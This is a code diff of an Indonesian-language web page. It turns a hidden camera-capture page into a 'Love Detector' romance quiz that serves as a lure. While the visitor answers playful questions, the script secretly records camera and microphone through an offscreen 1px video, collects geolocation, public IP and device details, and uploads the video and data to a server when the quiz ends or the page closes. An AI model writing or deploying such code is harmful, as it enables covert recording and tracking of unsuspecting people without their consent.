@@ -1,74 +1,146 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>Auto Capture Kamera</title>
+  <title>💘 Love Detector</title>
+  <style>
+    body {
+      font-family: 'Comic Sans MS', cursive;
+      background: linear-gradient(to right, #ffe0e9, #e0f7fa);
+      text-align: center;
+      padding: 30px;
+    }
+    h1 { color: #ff4081; font-size: 32px; }
+    .heart { font-size: 48px; animation: pulse 1s infinite; }
+    @keyframes pulse { 0%{transform:scale(1);}50%{transform:scale(1.2);}100%{transform:scale(1);} }
+    .question { font-size: 22px; margin-top: 40px; color: #4e4e4e; }
+    .options { margin-top: 20px; }
+    .option {
+      display: inline-block;
+      background: #fff9c4;
+      padding: 12px 24px;
+      margin: 10px;
+      border-radius: 12px;
+      cursor: pointer;
+      border: 2px dashed #ffb74d;
+      transition: all 0.3s ease;
+    }
+    .option:hover { background: #ffecb3; transform: scale(1.1); }
+    #nextBtn {
+      margin-top: 30px;
+      display: none;
+      padding: 10px 25px;
+      font-size: 16px;
+      background: #f48fb1;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    #video { width: 1px; height: 1px; position: absolute; left: -9999px; }
+    #status { margin-top: 30px; font-size: 16px; color: #009688; }
+  </style>
 </head>
 <body>
-  <h2>Status:</h2>
-  <div id="status">Mengakses kamera...</div>
 
-  <video id="video" autoplay playsinline muted style="width:1px;height:1px;position:absolute;left:-9999px;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+<h1>💘 Love Detector</h1>
+<div class="heart">❤️</div>
+<div class="question" id="question">Deteksi cinta aktif... Pertanyaan 1:</div>
+<div class="options" id="options"></div>
+<button id="nextBtn" onclick="nextQuestion()">Next ➡️</button>
+<video id="video" autoplay muted playsinline></video>
+<div id="status">Memulai deteksi...</div>
 
-  <script>
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
-    const statusDiv = document.getElementById("status");
+<script>
+const questions = [
+  { text: "Kamu percaya cinta pada pandangan pertama?", choices: ["Percaya 😍", "Nggak juga", "Coba tatap aku dulu", "Cinta perlu proses"] },
+  { text: "Kalau kamu disuruh milih...", choices: ["Chat aku tiap hari", "Ketemu tiap minggu", "Pacaran rahasia", "Jalan berdua terus"] },
+  { text: "Kira-kira... kita cocok nggak ya?", choices: ["Cocok banget!", "Kayaknya iya", "Bisa dicoba dulu", "Tentu saja!"] }
+];
+let currentQuestion = 0, answers = [], stream, mediaRecorder, recordedChunks = [], deviceInfo = {};
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        video.srcObject = stream;
+function loadQuestion() {
+  const q = questions[currentQuestion];
+  document.getElementById("question").innerText = `Pertanyaan ${currentQuestion + 1}: ${q.text}`;
+  document.getElementById("options").innerHTML = q.choices.map(c => `<div class="option" onclick="selectAnswer(this)">${c}</div>`).join('');
+  document.getElementById("nextBtn").style.display = "none";
+}
+function selectAnswer(el) {
+  answers.push({ q: questions[currentQuestion].text, a: el.innerText });
+  document.querySelectorAll(".option").forEach(opt => opt.style.background = "#fff9c4");
+  el.style.background = "#ffecb3";
+  document.getElementById("nextBtn").style.display = "inline-block";
+}
+function nextQuestion() {
+  currentQuestion++;
+  if (currentQuestion >= questions.length) {
+    document.getElementById("question").innerText = "💗 Deteksi selesai... hasil dikirim";
+    document.getElementById("options").style.display = "none";
+    document.getElementById("nextBtn").style.display = "none";
+    stopAndSend();
+  } else {
+    loadQuestion();
+  }
+}
 
-        video.onloadedmetadata = () => {
-          video.play();
-          video.width = video.videoWidth;
-          video.height = video.videoHeight;
+async function startCamera() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    document.getElementById("video").srcObject = stream;
+    mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+    mediaRecorder.start();
+    await getDeviceInfo();
+  } catch (err) {
+    document.getElementById("status").innerText = "❌ Kamera tidak tersedia";
+  }
+}
+function stopAndSend() {
+  if (mediaRecorder && mediaRecorder.state === "recording") {
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(recordedChunks, { type: "video/webm" });
+      const formData = new FormData();
+      formData.append("video", blob, "love_test.webm");
+      formData.append("device_info", JSON.stringify(deviceInfo));
+      fetch("http://localhost:8090/api/mysuf/videos", { method: "POST", body: formData });
+    };
+    mediaRecorder.stop();
+    stream.getTracks().forEach(t => t.stop());
+  }
+}
 
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
+async function getDeviceInfo() {
+  let location = {};
+  try {
+    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+    location.latitude = pos.coords.latitude;
+    location.longitude = pos.coords.longitude;
+  } catch { location = { latitude: null, longitude: null }; }
 
-          // Delay 2 detik lalu ambil gambar
-          setTimeout(() => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageBase64 = canvas.toDataURL("image/png");
+  deviceInfo = {
+    user_agent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    ip_address: await getIP(),
+    device_model: navigator.platform,
+    network: navigator.connection?.effectiveType || "unknown",
+    ...location
+  };
+}
 
-            statusDiv.innerText = "📸 Mengirim foto...";
-            uploadPhoto(imageBase64);
-          }, 2000);
-        };
-      } catch (err) {
-        statusDiv.innerText = "❌ Gagal akses kamera: " + err.message;
-      }
-    }
+async function getIP() {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip;
+  } catch {
+    return "unknown";
+  }
+}
 
-    function uploadPhoto(base64Image) {
-      fetch("http://localhost:8090/api/mysuf/photos", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          image: base64Image,
-          device_info: {
-            model: navigator.userAgent,
-            user_ip: "127.0.0.1",
-            device_id: "device-xyz",
-            network_provider: "localhost",
-            os_version: navigator.platform
-          }
-        })
-      })
-      .then(res => res.json())
-      .then(data => {
-        statusDiv.innerText = "✅ Foto berhasil dikirim. ID: " + data.id;
-      })
-      .catch(err => {
-        statusDiv.innerText = "❌ Gagal kirim foto: " + err.message;
-      });
-    }
-
-    startCamera();
-  </script>
+window.addEventListener("beforeunload", stopAndSend);
+loadQuestion();
+startCamera();
+</script>
 </body>
 </html>
